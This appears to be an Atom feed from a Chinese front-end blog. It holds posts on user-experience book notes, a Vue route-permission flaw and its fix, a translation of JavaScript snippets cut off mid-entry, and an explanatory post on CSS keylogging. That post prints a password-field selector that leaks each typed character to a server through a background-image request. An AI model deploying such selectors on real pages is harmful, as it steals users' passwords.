<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MINFIVE</title>
  
  <subtitle>MINFIVE BLOG</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.minfive.com/"/>
  <updated>2019-03-31T13:22:59.153Z</updated>
  <id>http://blog.minfive.com/</id>
  
  <author>
    <name>[object Object]</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>读《用户体验要素》总结</title>
    <link href="http://blog.minfive.com/2018/08/05/2018-08-05-user-centered-design/"/>
    <id>http://blog.minfive.com/2018/08/05/2018-08-05-user-centered-design/</id>
    <published>2018-08-04T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.153Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>《用户体验要素》这本书其实更适合叫《产品设计要素》，书中作者梳理了产品设计中的一些概念及方法，涵盖产品的整个生命周期，对于提高产品意识有极大的帮助。借用书中的几句话 “这不是一本关于‘怎么做’的书，这不是一本关于技术的书，这不是一本有答案的书，如果你需要一个大的概念，如果你需要了解用户体验设计师所做的决策的环境，这本书很适合你。”。</p></blockquote><h3 id="产品的五个层面"><a href="#产品的五个层面" class="headerlink" title="产品的五个层面"></a>产品的五个层面</h3><p>全书从头到尾都是在围绕一个经典模型在做阐述，从抽象到具象，可以分为5个层面：</p><p><img src="http://blog.static.minfive.com/post/18-08-05/0081cd79264982c228c6fcebeab04d15.jpg" alt="五层架构"></p><h4 id="战略层"><a href="#战略层" class="headerlink" title="战略层"></a>战略层</h4><p>明确产品目标（经营者想从产品得到什么），用户需求（用户想从产品得到什么）。重点是解决两者之间的冲突，找到平衡点。</p><ul><li>产品目标：包括产品的商业逻辑，商业价值，商业壁垒等</li><li>用户需求：用户想从产品得到什么，以及用户的期待</li></ul><p>战略层是重中之重，是对产品总体方向的把控，一个产品是否能够成功，很多时候取决于战略方向是否正确。企业的战略选择一定要小心，要对用户需求有全面理解，否则做到一定程度之后再想改版，牵连非常广泛。越是大公司，越是难以掉头，就是这个道理。</p><h4 id="范围层"><a href="#范围层" class="headerlink" title="范围层"></a>范围层</h4><p>进一步讨论产品所包含的具体功能，使产品从一个概念叙事开始转化为功能聚合体。</p><p>做好采集工作，确定功能范围和需求优先级，确定产品各种特新和功能最合适的组合方式。尽可能多的收集再尽可能多的放弃，梳理核心功能，<strong>明确不需要做什么要比列出需要做什么更重要</strong>，避免产品过于臃肿。</p><h4 id="结构层"><a href="#结构层" class="headerlink" title="结构层"></a>结构层</h4><p>为产品创建概念结构，将产品需要完成的特性组合起来。完成信息架构与交互设计（模式和顺序），并在此基础上进行交互设计，确定页面之间的层级和跳转关系。</p><h4 id="框架层"><a href="#框架层" class="headerlink" title="框架层"></a>框架层</h4><p>包括界面设计、导航设计、信息设计，框架是结构具体的表达方式。该阶段的工作可由产品经理或交互设计师完成，输出物一般为交互原型及功能说明。</p><h4 id="表现层"><a href="#表现层" class="headerlink" title="表现层"></a>表现层</h4><p>感知设计，包含了视觉设计和内容优化。一般由 UI 设计师或视觉设计师主导，依据产品原型进行视觉设计。产品经理负责在设计评审中对视觉设计是否符合产品整体规划进行把控。</p><h3 id="产品分层的意义"><a href="#产品分层的意义" class="headerlink" title="产品分层的意义"></a>产品分层的意义</h3><h4 id="明确业务主体方向"><a href="#明确业务主体方向" class="headerlink" title="明确业务主体方向"></a>明确业务主体方向</h4><p>明确业务主体方向可以避免多数时候在非核心问题上牵扯太多时间和精力。</p><h4 id="有利于协调团队工作"><a href="#有利于协调团队工作" class="headerlink" title="有利于协调团队工作"></a>有利于协调团队工作</h4><p>产品具体分层后有助于明确每个层面团队成员所需承担的任务。同时也可以用于各个团队成员来判断他们的行为是否正确。</p><h4 id="方便自下而上的建设、自上而下的调整"><a href="#方便自下而上的建设、自上而下的调整" class="headerlink" title="方便自下而上的建设、自上而下的调整"></a>方便自下而上的建设、自上而下的调整</h4><p>产品架构不是一成不变的，很多时候都需要基于反馈做快速调整，合理的分层有助于在调整时明确将受影响的点以及上下层，并能实时同步到团队工作中。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>全书中作者都在以广义的层面去阐述 “用户体验”，深入产品设计的方方面面。所谓的 “用户体验” 更多的是指 “以用户为核心” 产品设计理念 <strong>共鸣</strong>、<strong>专注</strong>、<strong>灌输</strong>，不仅仅在乎、重视客户的体验，也需要引导、提升他们的所感所知。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;《用户体验要素》这本书其实更适合叫《产品设计要素》，书中作者梳理了产品设计中的一些概念及方法，涵盖产品的整个生命周
      
    
    </summary>
    
      <category term="读书笔记" scheme="http://blog.minfive.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="产品" scheme="http://blog.minfive.com/tags/%E4%BA%A7%E5%93%81/"/>
    
      <category term="读书" scheme="http://blog.minfive.com/tags/%E8%AF%BB%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>关于 Vue 的路由权限管理</title>
    <link href="http://blog.minfive.com/2018/03/03/2018-03-03-vue-permission-control/"/>
    <id>http://blog.minfive.com/2018/03/03/2018-03-03-vue-permission-control/</id>
    <published>2018-03-02T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.153Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>曾经在工作上对 vue 路由权限管理这方面有过研究，这几天又看到了几篇相关的文章，再加上昨天电面中又再一次提及到，就索性整理了一下自己的一些看法，希望对大家有帮助。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>大体上实现的思路很简单，先上图：</p><p><img src="http://blog.static.minfive.com/post/18-03-03/route-permission-control.png" alt="permission-control"></p><p>无非是将路由配置按用户类型分割为 <code>用户路由</code> 和 <code>基本路由</code>，不同的用户类型可能存在不同的 <code>用户路由</code>，具体依赖实际业务。</p><ul><li><code>用户路由</code>: 当前用户所特有的路由</li><li><code>基本路由</code>：所有用户均可以访问的路由</li></ul><p>实现控制的方式分两种：</p><ol><li>通过 <a href="https://router.vuejs.org/zh-cn/api/router-instance.html#methods" target="_blank" rel="noopener">vue-router addRoutes</a> 方法注入路由实现控制</li><li>通过 <a href="https://router.vuejs.org/zh-cn/api/router-instance.html#methods" target="_blank" rel="noopener">vue-router beforeEach</a> 钩子限制路由跳转</li></ol><ul><li>addRoutes 方式：</li></ul><blockquote><p>通过请求服务端获取当前用户路由配置，编码为 vue-router 所支持的基本格式（具体如何编码取决于前后端协商好的数据格式），通过调用 <code>this.$router.addRoutes</code> 方法将编码好的用户路由注入到现有的 vue-router 实例中去，以实现用户路由。</p></blockquote><ul><li>beforeEach 方式</li></ul><blockquote><p>通过请求服务端获取当前用户路由配置，通过注册 <code>router.beforeEach</code> 钩子对路由的每次跳转进行管理，每次跳转都进行检查，如果目标路由不存再于 <code>基本路由</code> 和 当前用户的 <code>用户路由</code> 中，取消跳转，转为跳转错误页。</p></blockquote><p><strong>以上两种方式均需要在 <code>vue-router</code> 中配置错误页，以保证用户感知权限不足。</strong></p><p>两种方式的原理其实都是一样的，只不过 <code>addRoutes 方式</code> 通过注入路由配置告诉 <code>vue-router</code> ：“当前我们就只有这些路由，其它路由地址我们一概不认”，而 <code>beforeEach</code> 则更多的是依赖我们手动去帮 <code>vue-router</code> 辨别什么页面可以去，什么页面不可以去。说白了也就是 <code>自动</code> 与 <code>手动</code> 的差别。说到这，估计大家都会觉得既然是 <code>自动</code> 的，那肯定是 <code>addRoutes</code> 最方便快捷了，还能简化业务代码，笔者一开始也是这么认为的，但是！很多人都忽略了一点：</p><p><img src="http://blog.static.minfive.com/post/18-03-03/vue-router-addRoutes.png" alt="vue-router-addRoutes"></p><p><strong><code>addRoutes</code> 方法仅仅是帮你注入新的路由，并没有帮你剔除其它路由！</strong></p><p>设想存在这么一种情况：用户在自己电脑上登录了管理员账号，这个时候会向路由中注入<strong>管理员的路由</strong>，然后再退出登录，保持页面不刷新，改用普通用户账号进行登录，这个时候又会向路由中注入<strong>普通用户的路由</strong>，那么，在路由中将存在两种用户类型的路由，即使用户不感知，通过改变 url，普通用户也可以访问管理员的页面！</p><p>对于这个问题，也有一个解决办法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"></span><br><span class="line">Vue.use(Router)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> createRouter = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> Router(&#123;</span><br><span class="line">  mode: <span class="string">'history'</span>,</span><br><span class="line">  routes: []</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = createRouter()</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">resetRouter</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> newRouter = createRouter()</span><br><span class="line">  router.matcher = newRouter.matcher</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><p>通过新建一个全新的 <code>Router</code>，然后将新的 <code>Router.matcher</code> 赋给当前页面的管理 <code>Router</code>，以达到更新路由配置的目的。</p><p>笔者做了一个<a href="https://github.com/MinFE/vue-router-premission-control-demo" target="_blank" rel="noopener">小demo</a>，大家可以去<a href="https://minfe.github.io/vue-router-premission-control-demo/" target="_blank" rel="noopener">体验一下</a>。</p><p>关于上述问题，在 <a href="https://github.com/vuejs/vue-router" target="_blank" rel="noopener">vue-router</a> 的 github issues 下有过讨论，分别是：</p><ul><li><a href="https://github.com/vuejs/vue-router/issues/1436" target="_blank" rel="noopener">Add option to Reset/Delete Routes #1436</a></li><li><a href="https://github.com/vuejs/vue-router/issues/1234" target="_blank" rel="noopener">Feature request: replace routes dynamically #1234</a></li></ul><p>有兴趣的可以去围观下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;曾经在工作上对 vue 路由权限管理这方面有过研究，这几天又看到了几篇相关的文章，再加上昨天电面中又再一次提及到，就索性整理了一下自己的一些
      
    
    </summary>
    
      <category term="经验总结" scheme="http://blog.minfive.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="javascript" scheme="http://blog.minfive.com/tags/javascript/"/>
    
      <category term="vue" scheme="http://blog.minfive.com/tags/vue/"/>
    
      <category term="权限管理" scheme="http://blog.minfive.com/tags/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>使用 Css 获取用户密码</title>
    <link href="http://blog.minfive.com/2018/02/23/2018-02-23-css-hacker/"/>
    <id>http://blog.minfive.com/2018/02/23/2018-02-23-css-hacker/</id>
    <published>2018-02-22T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.152Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>新年工作第一天，在 github 上闲逛，发现了一个很有趣的项目，叫 <a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a>，这是一个演示如何用 css 去获取用户输入的密码的项目，这个项目与一两个月前的另外一个很火的项目 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="noopener">CrookedStyleSheets</a> 类似，甚至于有可能 <a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 就是受 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="noopener">CrookedStyleSheets</a> 启发才创建的。</p><h3 id="不一样的-css"><a href="#不一样的-css" class="headerlink" title="不一样的 css"></a>不一样的 css</h3><p>说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。</p><p>话题回到不一样的 css 上，github 上 <a href="https://github.com/jbtronics" target="_blank" rel="noopener">jbtronics</a> 给出了这样一份答案 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="noopener">CrookedStyleSheets</a>，在这里笔者直接给上该项目的<a href="https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md" target="_blank" rel="noopener">中文文档</a>，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。</p><h3 id="css-监听键盘记录"><a href="#css-监听键盘记录" class="headerlink" title="css 监听键盘记录"></a>css 监听键盘记录</h3><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，<a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 更为巧妙的使用多重选择器去捕获相应的按键事件。</p><p>核心代码如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type="password"]</span><span class="selector-attr">[value$="1"]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">"http://localhost:3000/1"</span>); &#125;</span><br></pre></td></tr></table></figure><p>解释如下：</p><p>当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 <code>http://localhost:3000/1</code> 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。</p><p>当 <code>value$=&quot;1&quot;</code> 时，我们可以监听用户输入 <code>1</code>，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：</p><p><img src="http://blog.static.minfive.com/post/18-02-23/code.png" alt="code"></p><p>当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;新年工作第一天，在 github 上闲逛，发现了一个很有趣的项目，叫 &lt;a href=&quot;https://github.com/maxcheh
      
    
    </summary>
    
      <category term="日常学习" scheme="http://blog.minfive.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="css" scheme="http://blog.minfive.com/tags/css/"/>
    
      <category term="安全" scheme="http://blog.minfive.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>30s代码片段翻译</title>
    <link href="http://blog.minfive.com/2018/01/07/2018-01-07-30-seconds-of-code-translate/"/>
    <id>http://blog.minfive.com/2018/01/07/2018-01-07-30-seconds-of-code-translate/</id>
    <published>2018-01-06T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.153Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这是对 github 上<a href="https://github.com/Chalarangelo/30-seconds-of-code" target="_blank" rel="noopener">30s代码片段</a>的翻译整理，由于作者的文档是通过脚本生成的，也就懒得去提pull了，整理了放到博客上供大家学习参考，后续会持续跟进翻译。</p></blockquote><h2 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h2><h3 id="Array-concatenation-合并参数"><a href="#Array-concatenation-合并参数" class="headerlink" title="Array concatenation (合并参数)"></a>Array concatenation (合并参数)</h3><p>使用 <code>Array.concat()</code> 来连接参数中的任何数组或值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arrayConcat = <span class="function">(<span class="params">arr, ...args</span>) =&gt;</span> arr.concat(...args);</span><br><span class="line"><span class="comment">// arrayConcat([1], 2, [3], [[4]]) -&gt; [1,2,3,[4]]</span></span><br></pre></td></tr></table></figure><h3 id="Array-difference-取数组不同项"><a href="#Array-difference-取数组不同项" class="headerlink" title="Array difference (取数组不同项)"></a>Array difference (取数组不同项)</h3><p>以 <code>b</code> 创建 <code>Set</code>，然后使用 <code>Array.filter()</code> 过滤，只保留 <code>b</code> 中不包含的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> difference = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123; <span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>(b); <span class="keyword">return</span> a.filter(<span class="function"><span class="params">x</span> =&gt;</span> !s.has(x)); &#125;;</span><br><span class="line"><span class="comment">// difference([1,2,3], [1,2]) -&gt; [3]</span></span><br></pre></td></tr></table></figure><h3 id="Array-intersection-取数组相同项"><a href="#Array-intersection-取数组相同项" class="headerlink" title="Array intersection (取数组相同项)"></a>Array intersection (取数组相同项)</h3><p>以 <code>b</code> 创建 <code>Set</code>，然后使用 <code>Array.filter()</code> 过滤，只保留 <code>b</code> 中包含的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> intersection = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123; <span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>(b); <span class="keyword">return</span> a.filter(<span class="function"><span class="params">x</span> =&gt;</span> s.has(x)); &#125;;</span><br><span class="line"><span class="comment">// intersection([1,2,3], [4,3,2]) -&gt; [2,3]</span></span><br></pre></td></tr></table></figure><h3 id="Array-union-合并数组去重"><a href="#Array-union-合并数组去重" class="headerlink" title="Array union (合并数组去重)"></a>Array union (合并数组去重)</h3><p>用 <code>a</code> 和 <code>b</code> 的所有值创建一个 <code>Set</code> 并转换成一个数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> union = <span class="function">(<span class="params">a, b</span>) =&gt;</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>([...a, ...b]));</span><br><span class="line"><span class="comment">// union([1,2,3], [4,3,2]) -&gt; [1,2,3,4]</span></span><br></pre></td></tr></table></figure><h3 id="Average-of-array-of-numbers-通过数组取平均值"><a href="#Average-of-array-of-numbers-通过数组取平均值" class="headerlink" title="Average of array of numbers (通过数组取平均值)"></a>Average of array of numbers (通过数组取平均值)</h3><p>使用 <code>Array.reduce()</code> 将每个值添加到一个累加器，用值 <code>0</code> 初始化，除以数组的长度。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> average = <span class="function"><span class="params">arr</span> =&gt;</span> arr.reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc + val, <span class="number">0</span>) / arr.length;</span><br><span class="line"><span class="comment">// average([1,2,3]) -&gt; 2</span></span><br></pre></td></tr></table></figure><h3 id="Chunk-array-数组切块"><a href="#Chunk-array-数组切块" class="headerlink" title="Chunk array (数组切块)"></a>Chunk array (数组切块)</h3><p>使用 <code>Array.from()</code> 创建一个满足块的数量的新的数组。<br>使用 <code>Array.slice()</code> 将新数组的每个元素映射到 <code>size</code> 长度的块。<br>如果原始数组不能均匀分割，最后的块将包含剩余的元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chunk = <span class="function">(<span class="params">arr, size</span>) =&gt;</span></span><br><span class="line">  <span class="built_in">Array</span>.from(&#123;<span class="attr">length</span>: <span class="built_in">Math</span>.ceil(arr.length / size)&#125;, (v, i) =&gt; arr.slice(i * size, i * size + size));</span><br><span class="line"><span class="comment">// chunk([1,2,3,4,5], 2) -&gt; [[1,2],[3,4],5]</span></span><br></pre></td></tr></table></figure><h3 id="Compact-压缩"><a href="#Compact-压缩" class="headerlink" title="Compact (压缩)"></a>Compact (压缩)</h3><p>使用 <code>Array.filter()</code> 去过滤掉假值（<code>false</code>, <code>null</code>, <code>0</code>, <code>&quot;&quot;</code>, <code>undefined</code> 和 <code>NaN</code>）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> compact = <span class="function">(<span class="params">arr</span>) =&gt;</span> arr.filter(<span class="function"><span class="params">v</span> =&gt;</span> v);</span><br><span class="line"><span class="comment">// compact([0, 1, false, 2, '', 3, 'a', 'e'*23, NaN, 's', 34]) -&gt; [ 1, 2, 3, 'a', 's', 34 ]</span></span><br></pre></td></tr></table></figure><h3 id="Count-occurrences-of-a-value-in-array-计算数组中指定值出现的次数"><a href="#Count-occurrences-of-a-value-in-array-计算数组中指定值出现的次数" class="headerlink" title="Count occurrences of a value in array (计算数组中指定值出现的次数)"></a>Count occurrences of a value in array (计算数组中指定值出现的次数)</h3><p>使用 <code>Array.reduce()</code> 去迭代数组，当值相同时，递增计数器。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> countOccurrences = <span class="function">(<span class="params">arr, value</span>) =&gt;</span> arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> v === value ? a + <span class="number">1</span> : a + <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// countOccurrences([1,1,2,1,2,3], 1) -&gt; 3</span></span><br></pre></td></tr></table></figure><h3 id="Deep-flatten-array-深度展开数组"><a href="#Deep-flatten-array-深度展开数组" class="headerlink" title="Deep flatten array (深度展开数组)"></a>Deep flatten array (深度展开数组)</h3><p>使用递归。<br>使用 <code>Array.reduce()</code> 获取所有不是数组的值，并将数组展开。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> deepFlatten = <span class="function"><span class="params">arr</span> =&gt;</span></span><br><span class="line">  arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> a.concat(<span class="built_in">Array</span>.isArray(v) ? deepFlatten(v) : v), []);</span><br><span class="line"><span class="comment">// deepFlatten([1,[2],[[3],4],5]) -&gt; [1,2,3,4,5]</span></span><br></pre></td></tr></table></figure><h3 id="Drop-elements-in-array-删除数组中的元素"><a href="#Drop-elements-in-array-删除数组中的元素" class="headerlink" title="Drop elements in array (删除数组中的元素)"></a>Drop elements in array (删除数组中的元素)</h3><p>循环访问数组，使用 <code>Array.shift()</code> 删除数组的第一个元素，直到函数的返回值为 <code>true</code>，返回其余的元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dropElements = <span class="function">(<span class="params">arr, func</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (arr.length &gt; <span class="number">0</span> &amp;&amp; !func(arr[<span class="number">0</span>])) arr.shift();</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// dropElements([1, 2, 3, 4], n =&gt; n &gt;= 3) -&gt; [3,4]</span></span><br></pre></td></tr></table></figure><h3 id="Fill-array-填充数组"><a href="#Fill-array-填充数组" class="headerlink" title="Fill array (填充数组)"></a>Fill array (填充数组)</h3><p>使用 <code>Array.map()</code> 将 <code>start</code>（包含）和 <code>end</code>（不包含）之间的值映射为 <code>value</code>。<br>省略 <code>start</code> 将从第一个元素开始／省略 <code>end</code> 将在数组最后结束。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fillArray = <span class="function">(<span class="params">arr, value, start = <span class="number">0</span>, end = arr.length</span>) =&gt;</span></span><br><span class="line">  arr.map(<span class="function">(<span class="params">v, i</span>) =&gt;</span> i &gt;= start &amp;&amp; i &lt; end ? value : v);</span><br><span class="line"><span class="comment">// fillArray([1,2,3,4],'8',1,3) -&gt; [1,'8','8',4]</span></span><br></pre></td></tr></table></figure><h3 id="Filter-out-non-unique-values-in-an-array-过滤掉数组中重复的值"><a href="#Filter-out-non-unique-values-in-an-array-过滤掉数组中重复的值" class="headerlink" title="Filter out non-unique values in an array (过滤掉数组中重复的值)"></a>Filter out non-unique values in an array (过滤掉数组中重复的值)</h3><p>使用 <code>Array.filter()</code> 保证数组仅包含唯一值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> filterNonUnique = <span class="function"><span class="params">arr</span> =&gt;</span> arr.filter(<span class="function"><span class="params">i</span> =&gt;</span> arr.indexOf(i) === arr.lastIndexOf(i));</span><br><span class="line"><span class="comment">// filterNonUnique([1,2,2,3,4,4,5]) -&gt; [1,3,5]</span></span><br></pre></td></tr></table></figure><h3 id="Flatten-array-up-to-depth-展开指定深度的数组"><a href="#Flatten-array-up-to-depth-展开指定深度的数组" class="headerlink" title="Flatten array up to depth (展开指定深度的数组)"></a>Flatten array up to depth (展开指定深度的数组)</h3><p>使用递归去递减深度。<br>使用 <code>Array.reduce()</code> 和 <code>Array.concat()</code> 来合并元素或数组。<br>基本情况下，当深度为 <code>1</code> 时停止递归。<br>省略第二个参数，展开深度为 <code>1</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flattenDepth = <span class="function">(<span class="params">arr, depth = <span class="number">1</span></span>) =&gt;</span></span><br><span class="line">  depth != <span class="number">1</span> ? arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> a.concat(<span class="built_in">Array</span>.isArray(v) ? flattenDepth(v, depth - <span class="number">1</span>) : v), [])</span><br><span class="line">  : arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> a.concat(v), []);</span><br><span class="line"><span class="comment">// flattenDepth([1,[2],[[[3],4],5]], 2) -&gt; [1,2,[3],4,5]</span></span><br></pre></td></tr></table></figure><h3 id="Flatten-array-拼合数组"><a href="#Flatten-array-拼合数组" class="headerlink" title="Flatten array (拼合数组)"></a>Flatten array (拼合数组)</h3><p>使用 <code>Array.reduce()</code> 来获取内部所有元素并用 <code>concat()</code> 合并它们。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flatten = <span class="function"><span class="params">arr</span> =&gt;</span> arr.reduce(<span class="function">(<span class="params">a, v</span>) =&gt;</span> a.concat(v), []);</span><br><span class="line"><span class="comment">// flatten([1,[2],3,4]) -&gt; [1,2,3,4]</span></span><br></pre></td></tr></table></figure><h3 id="Get-max-value-from-array-获取数组中的最大值"><a href="#Get-max-value-from-array-获取数组中的最大值" class="headerlink" title="Get max value from array (获取数组中的最大值)"></a>Get max value from array (获取数组中的最大值)</h3><p>使用 <code>Math.max()</code> 配合 <code>...</code> 扩展运算符去获取数组中的最大值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arrayMax = <span class="function"><span class="params">arr</span> =&gt;</span> <span class="built_in">Math</span>.max(...arr);</span><br><span class="line"><span class="comment">// arrayMax([10, 1, 5]) -&gt; 10</span></span><br></pre></td></tr></table></figure><h3 id="Get-min-value-from-array-获取数组中的最小值"><a href="#Get-min-value-from-array-获取数组中的最小值" class="headerlink" title="Get min value from array (获取数组中的最小值)"></a>Get min value from array (获取数组中的最小值)</h3><p>使用 <code>Math.max()</code> 配合 <code>...</code> 